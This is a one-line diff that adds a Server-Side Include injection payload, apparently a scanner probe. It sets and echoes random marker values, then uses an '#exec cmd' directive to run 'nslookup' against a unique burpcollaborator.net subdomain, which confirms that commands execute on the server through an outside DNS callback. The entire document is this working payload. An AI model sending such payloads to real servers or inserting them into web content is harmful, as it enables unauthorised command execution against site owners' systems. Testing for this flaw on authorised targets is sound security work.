@@ -1,0 +1,1 @@
+<!--#set var="vhz" value="ugykgpxteb"--><!--#set var="xj1" value="wi0mirzvgd"--><!--#echo var="vhz"--><!--#echo var="xj1"--><!--#exec cmd="nslookup -q=cname h3l73ckg1ygtjdacbek0o0ahx83ar2pqhdd12.burpcollaborator.net" -->
